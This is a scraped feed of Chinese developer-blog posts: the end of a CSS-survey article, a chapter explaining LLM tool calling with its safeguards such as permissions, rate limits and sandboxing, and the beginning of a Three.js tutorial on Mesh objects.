<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/105ce52fd632442aa0623d5c73e8eff5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Ya05769:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769483041&amp;x-signature=D5Mt8kShf1PSVoKu8BZRmNGjZf8%3D" alt="" loading="lazy"/></p>
<p>之所以被大家吐槽，多是因为技术局限性问题，比如：</p>
<ul>
<li>能限制行数，无法精确控制高度</li>
<li>浏览器兼容性还不够好</li>
<li>与动态内容配合困难：当文本内容长度不确定时，难以准确控制显示效果</li>
</ul>
<p>当我们实际使用 line-clamp 的时候，还要配合一系列属性比如 display、-webkit-box-orient、overflow、text-overflow，这种组合方案既复杂又不够语义化。</p>
<h2 data-id="heading-6">7. 结论</h2>
<p>CSS 这些年无疑在快速的发展中，而人们对 CSS 的满意度也在持续攀升。</p>
<p>引用报告中的一句话：</p>
<p><strong>“如果说 2025 年的主题是稳定不可能之事，那么 2026 年或许是实现期待已久的梦想之年。”</strong></p>
<p>对于热爱 CSS 的人来说，现在正是尝试、学习并参与塑造未来发展方向的最佳时机。</p>
<p>我是冴羽，10 年笔耕不辍，专注前端领域，更新了 10+ 系列、300+ 篇原创技术文章，翻译过 Svelte、Solid.js、TypeScript 文档，著有小册《Next.js 开发指南》、《Svelte 开发指南》、《Astro 实战指南》。</p>
<p>欢迎围观我的“<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">网页版朋友圈</a>”，关注我的公众号：<strong>冴羽（或搜索 yayujs）</strong>，每天分享前端知识、AI 干货。</p>
<p>新的一年，如果你想快速改变自己，欢迎加入我的知识星球：“<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2Fcourse%3Fto%3Dzsxq" target="_blank" title="https://yayujs.com/course?to=zsxq" ref="nofollow noopener noreferrer">冴羽·前端大佬成长之路</a>”，10 年工作总结、100+ 篇精华主题、70W 字原创内容，带你升级认知、重构生活、建立知识管理系统、通关面试、引领职场。用一年时间，实现十倍成长，一鸣惊人。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[第 4 章：工具调用基础——让 LLM 走出“缸中之脑”]]></title>    <link>https://juejin.cn/post/7596943803934326824</link>    <guid>https://juejin.cn/post/7596943803934326824</guid>    <pubDate>2026-01-20T02:33:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596943803934326824" data-draft-id="7596943803934228520" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="第 4 章：工具调用基础——让 LLM 走出“缸中之脑”"/> <meta itemprop="keywords" content="前端,Agent,AIGC"/> <meta itemprop="datePublished" content="2026-01-20T02:33:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="芋圆ai"/> <meta itemprop="url" content="https://juejin.cn/user/1451828494217415"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            第 4 章：工具调用基础——让 LLM 走出“缸中之脑”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1451828494217415/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    芋圆ai
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T02:33:46.000Z" title="Tue Jan 20 2026 02:33:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">第 4 章：工具调用基础——让 LLM 走出“缸中之脑”</h2>
<blockquote>
<p><strong>"工具是人类进化的延伸。"</strong></p>
<p><strong>对于 LLM 而言，Tool（工具）就是它的手脚。没有工具，它只是一个被困在服务器里的"缸中之脑"，博学但无力；有了工具，它才能真正干预物理世界，从 Chatbot 进化为 Agent。</strong></p>
</blockquote>
<h3 data-id="heading-1">4.1 核心痛点：全知全能的"局限性"</h3>
<p>哲学上有一个思想实验叫<strong>缸中之脑</strong>：一个大脑即使能思考整个宇宙，如果无法<strong>感知</strong>当下的温度，也无法<strong>改变</strong>任何现实，它就是无力的。</p>
<p>这就是 LLM 的根本困境。</p>
<p>就像我们部署的客服 Agent 回答极其流畅，但在被问到"今天的贷款利率"时，它自信地引用了训练数据中的 4.35%（2020 年数据），而当时实际利率已降至 3.65%。</p>
<p><strong>这次事故揭示了 LLM 的致命短板：</strong></p>

























<table><thead><tr><th>维度</th><th>能力层级</th><th>根本原因</th></tr></thead><tbody><tr><td><strong>语言能力</strong></td><td><strong>教授级</strong></td><td>掌握了人类几乎所有的文本模式</td></tr><tr><td><strong>现实连接</strong></td><td><strong>断网级</strong></td><td>知识截止于训练结束那一刻（Knowledge Cutoff）</td></tr><tr><td><strong>行动能力</strong></td><td><strong>零</strong></td><td>只能生成字符，不能点击鼠标、不能发请求</td></tr></tbody></table>
<p>要让这个"大脑"有用，必须给它接上神经末梢（API）和机械臂（执行器）。在 Agent 领域，这就是 <strong>Function Calling（工具调用）</strong> 。</p>
<h3 data-id="heading-2">4.2 本质还原：Function Calling 的工作流</h3>
<p>把 Function Calling 理解为"调用函数"是程序员的思维定势；在 Agent 的语境下，它其实是一种**"委托协议"**。</p>
<p>当 LLM 决定使用工具时，它并不是自己在"运行"什么，而是在填写一张<strong>业务委托单</strong>。</p>
<p><strong>它的内心独白是这样的：</strong></p>
<blockquote>
<p>"嘿，系统，我算不准这个，但我知道你们有个叫'计算器'的部门。请帮我算一下'5 的阶乘'，然后把结果填在单子上还给我。"</p>
</blockquote>
<p><strong>流程的本质是：</strong></p>
<ol>
<li><strong>思考（LLM）</strong> ：分析用户意图，判断是否需要外援。</li>
<li><strong>委托（Protocol）</strong> ：LLM 输出一个标准的结构化请求（比如一张包含工具名和参数的工单）。</li>
<li><strong>执行（System）</strong> ：Agent 系统截获这张工单，去执行真正的代码（查库、搜索、计算）。</li>
<li><strong>反馈（Result）</strong> ：系统把执行结果打包成文本，喂回给 LLM。</li>
<li><strong>再思考（LLM）</strong> ：LLM 拿着结果，组织语言回答用户。</li>
</ol>
<p>这种**"思考与执行解耦"**的设计，是 Agent 能够安全落地的基石——LLM 负责决策（大脑），系统负责执行（手脚），各司其职。</p>
<h3 data-id="heading-3">4.3 深度解剖：一个工业级工具的"五脏六腑"</h3>
<p>很多教程只教你给工具起个名字，这是玩具级的做法。在工业级框架中，一个成熟的工具设计必须像<strong>入职员工</strong>一样，经过严格的背景调查和岗位定义。</p>
<h4 data-id="heading-4">1. 岗位说明书（Metadata）：风控的防线</h4>
<p>在商业环境中，<strong>失控的 Agent 比人工智障更可怕。</strong> 因此，我们定义工具时，不仅仅是定义功能，更是在定义<strong>边界</strong>。</p>
<p>一个完善的工具定义应包含以下"安全带"：</p>
<ul>
<li><strong>身份标识</strong>：它是谁？（唯一名称）</li>
<li><strong>操作手册</strong>：它是干什么的？（给 LLM 看的说明书）</li>
<li><strong>权限等级</strong>：是否需要人类授权？（防止它私自删除数据库）</li>
<li><strong>熔断机制（Rate Limit）</strong> ：每分钟允许调几次？（防止 Agent 陷入死循环搞挂下游服务）</li>
<li><strong>止损机制（Timeout）</strong> ：最多允许运行多久？（防止任务卡死）</li>
<li><strong>财务审计</strong>：调用一次大概花多少钱？（控制 Token 成本）</li>
</ul>
<p><strong>真实案例</strong>：如果没有熔断机制，一个陷入逻辑死循环的 Agent 曾在一分钟内对搜索接口发起了 500 次调用，直接导致账号因欠费被封锁。</p>
<h4 data-id="heading-5">2. 描述工程（Description）：把 LLM 当实习生</h4>
<p>这是工具定义中<strong>最关键</strong>的部分。LLM 是否调用工具、参数填得对不对，全看"操作手册"（Description）写得好不好。</p>
<p><strong>一个实用的原则：不要把 LLM 当作冷冰冰的编译器，要把它当作新来的实习生。</strong></p>
<ul>
<li>
<p><strong>❌ 糟糕的指令（程序员思维）</strong> ：</p>
<blockquote>
<p>"Google 搜索功能。" <em>（太简略，实习生不知道什么时候该用，什么时候不该用）</em></p>
</blockquote>
</li>
<li>
<p><strong>✅ 优秀的指令（管理者思维）</strong> ：</p>
<blockquote>
<p>"当用户询问实时新闻、具体事实（如股价、天气）或 2023 年后的事件时使用此工具。**注意：**不要用于查询通用常识（如'苹果的颜色'），也不要用于回答哲学问题。"</p>
</blockquote>
</li>
</ul>
<p>你需要明确告诉它： <strong>"做什么"</strong> 、 <strong>"什么情况做"<strong>以及</strong>"什么情况不做"</strong> 。</p>
<h4 data-id="heading-6">3. 容错与防御：系统的"自动纠偏"</h4>
<p>LLM 是概率模型，它大概率是对的，但总有 0.1% 的概率会犯迷糊。比如你让它填数字，它可能填了数字的汉字写法。</p>
<p>成熟的 Agent 系统必须具备<strong>防御性</strong>：它像一个经验丰富的老员工，在执行"实习生"（LLM）发出的工单前，会默默修正那些明显的格式错误（自动类型转换、范围截断），而不是直接报错让系统崩溃。</p>
<h3 data-id="heading-7">4.4 认知负荷：为什么工具不能太多？</h3>
<p>如果你给 Agent 一次性挂载了 50 个工具，你会发现它变笨了。它可能该用搜索的时候用了爬虫，或者干脆拒绝回答。</p>
<p><strong>原因在于"认知负荷"（Cognitive Load）和注意力分散。</strong></p>
<p>LLM 的注意力窗口是有限的。这就好比你让一个修理工把 50 把不同的扳手都挂在腰带上，他干活时光是找工具就要花半天，还容易拿错。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f33d33c0c96447d98fbdeb07ba84a010~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IqL5ZyGYWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769481225&amp;x-signature=DXeSU5qTYAUxcg4Yc6KqSZDzLCE%3D" alt="0010页.jpg" loading="lazy"/></p>
<h4 data-id="heading-8">解决方案：动态工具加载（Dynamic Loading）</h4>
<p>不要一次性把整个仓库倒出来。根据任务的上下文，只给它最需要的工具包。</p>
<ul>
<li><strong>写作模式</strong>：只提供"知识库检索"工具，屏蔽代码解释器和搜索引擎，减少干扰。</li>
<li><strong>分析模式</strong>：只提供"计算器"和"数据库查询"工具。</li>
</ul>
<p><strong>少即是多。</strong> 只有精准地限制选项，才能显著提高 Agent 的决策质量。</p>
<h3 data-id="heading-9">4.5 避坑指南：墨菲定律的实证</h3>
<p>在数百个 Agent 的落地过程中，我们验证了墨菲定律：<strong>如果工具参数可能被填错，LLM 一定会填错。</strong></p>
<h4 data-id="heading-10">陷阱 1：参数幻觉</h4>
<p>LLM 经常会"自作聪明"，编造出 API 中根本不存在的参数。</p>
<ul>
<li><strong>解法（菜单化）</strong> ：不要给它开放式填空题，尽量给它选择题。明确告诉它："这个参数只能选 A、B 或 C"。</li>
</ul>
<h4 data-id="heading-11">陷阱 2：格式黑洞</h4>
<p>你让它填日期，它可能填 "2024年1月1日"，也可能填 "Jan 1st"。</p>
<ul>
<li><strong>解法（样本化）</strong> ：在说明书中直接给出<strong>少样本示例（Few-Shot Examples）</strong> 。比如："日期格式必须参考：2024-05-20"。</li>
</ul>
<h4 data-id="heading-12">陷阱 3：安全漏洞</h4>
<p>允许 LLM 直接生成代码并在你的机器上运行，无异于把家门钥匙交给陌生人。</p>
<ul>
<li><strong>解法（沙箱化）</strong> ：永远不要信任 LLM 的输出。所有的执行操作必须在**沙箱（Sandbox）**或隔离容器中进行，确保即使它发疯，也破坏不了主系统。</li>
</ul>
<h3 data-id="heading-13">4.6 总结</h3>
<p>工具调用不仅仅是技术接口的对接，它是构建 Agent <strong>行动力</strong> 的关键。</p>
<ol>
<li><strong>连接现实</strong>：工具让 LLM 突破了训练数据的时空限制，从"空想家"变成了"实干家"。</li>
<li><strong>工程落地</strong>：必须通过权限、限流、容错等机制，把概率性的 AI 关进确定性的工程笼子里。</li>
<li><strong>认知管理</strong>：通过精心设计的说明书和动态筛选机制，降低 LLM 的决策难度，像管理实习生一样管理 AI。</li>
</ol>
<p>掌握了工具调用，你的 LLM 就不再是一个只会陪聊的 Chatbot，而是一个能真正创造价值的数字员工。</p>
<p>但问题来了：如果我们开发的工具只能在自己的系统里用，是不是太封闭了？能不能让 Agent 直接使用别人写好的工具，甚至直接操控原本给人类设计的软件？</p>
<p>下一章，我们将探讨 <strong>MCP (Model Context Protocol)</strong> —— 它是连接不同 Agent 生态的"通用语"，是实现 AI 互联的关键一步。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc84839bb76847cabc29692eb298be05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IqL5ZyGYWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769481225&amp;x-signature=114L0o0TXWSqQy3ty3YvXjT2yS4%3D" alt="0015页.jpg" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[学习Three.js--网格模型]]></title>    <link>https://juejin.cn/post/7596966040922062854</link>    <guid>https://juejin.cn/post/7596966040922062854</guid>    <pubDate>2026-01-20T03:05:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596966040922062854" data-draft-id="7596997542041681963" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="学习Three.js--网格模型"/> <meta itemprop="keywords" content="前端,three.js"/> <meta itemprop="datePublished" content="2026-01-20T03:05:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="造轮子的猪"/> <meta itemprop="url" content="https://juejin.cn/user/497453720940158"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            学习Three.js--网格模型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/497453720940158/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    造轮子的猪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:05:11.000Z" title="Tue Jan 20 2026 03:05:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">学习Three.js--网格模型</h2>
<h3 data-id="heading-1">前置核心说明</h3>
<p>上文说明了 <strong>「场景(Scene)、相机(Camera)、渲染器(Renderer)」三大核心、几何体(Geometry)、材质(Material)</strong> 相关知识，而 <strong>「网格模型(Mesh)」就是衔接「几何体」和「材质」的核心桥梁</strong>，是 Three.js 中实现<strong>可视化3D物体的最终载体</strong>。</p>
<h4 data-id="heading-2">核心关系</h4>
<pre><code class="hljs language-scss" lang="scss">几何体(Geometry) → 物体的「骨架/形状」
材质(Material) → 物体的「皮肤/外观」
网格模型(Mesh) → 将「骨架+皮肤」绑定为一个完整的、可渲染的<span class="hljs-number">3</span>D实体对象
</code></pre>
<p>所有能在 Three.js 场景中<strong>看到的实体3D物体</strong>，本质都是各类「网格/渲染对象」；
所有网格对象创建后，都通过 <code>scene.add(网格对象)</code> 方法添加到场景中才能被渲染；
单位遵循 Three.js 右手坐标系：<strong>X轴右、Y轴上、Z轴外</strong>，角度单位均为「弧度」。</p>
<hr/>
<h3 data-id="heading-3">一、什么是 THREE.Mesh 核心网格模型</h3>
<h4 data-id="heading-4">1.1 概念与核心作用</h4>
<p><code>THREE.Mesh</code> 是 Three.js 中 <strong>最基础、最核心、使用率99%的网格渲染类</strong>，也是所有<strong>立体实体模型</strong>的核心载体。</p>
<ul>
<li>作用：接收「几何体」和「材质」两个核心参数，将二者封装为一个<strong>具备形状+外观的完整3D对象</strong>；</li>
<li>特性：<code>THREE.Mesh</code> 渲染的是<strong>带面、带体积的实心几何体</strong>，支持光照、阴影、纹理、透明度等所有材质特性；</li>
<li>适用场景：<strong>所有立体3D实体</strong> → 立方体、球体、圆柱、自定义模型等，都是通过 <code>THREE.Mesh</code> 实现渲染。</li>
</ul>
<h4 data-id="heading-5">1.2 标准创建语法 &amp; 完整参数</h4>
<h5 data-id="heading-6">基础语法</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 语法：new THREE.Mesh(几何体, 材质)</span>
<span class="hljs-keyword">const</span> mesh = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>( geometry, material );
scene.<span class="hljs-title function_">add</span>(mesh); <span class="hljs-comment">// 添加到场景才能渲染</span>
</code></pre>
<h5 data-id="heading-7">参数详细说明</h5>























<table><thead><tr><th>参数名</th><th>类型</th><th>必填</th><th>说明</th></tr></thead><tbody><tr><td><code>geometry</code></td><td>THREE.Geometry / THREE.BufferGeometry</td><td>是</td><td>几何体对象，定义网格的形状/结构（如BoxGeometry、SphereGeometry）</td></tr><tr><td><code>material</code></td><td>THREE.Material 任意子类</td><td>是</td><td>材质对象，定义网格的外观（如MeshStandardMaterial、MeshBasicMaterial）</td></tr></tbody></table>
<h5 data-id="heading-8">扩展语法（材质传数组，一个几何体绑定多个材质）</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 一个几何体的不同面，绑定不同材质，材质数组的长度要与几何体的面数匹配</span>
<span class="hljs-keyword">const</span> mesh = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>( geometry, [material1, material2, material3] );
</code></pre>
<h4 data-id="heading-9">1.3 核心注意事项</h4>
<ol>
<li><strong>材质/几何体复用</strong>：同一个几何体/材质可以被多个 <code>Mesh</code> 复用，比如100个立方体用同一个几何体+材质，仅创建1份即可，<strong>极大节省内存，优化性能</strong>；</li>
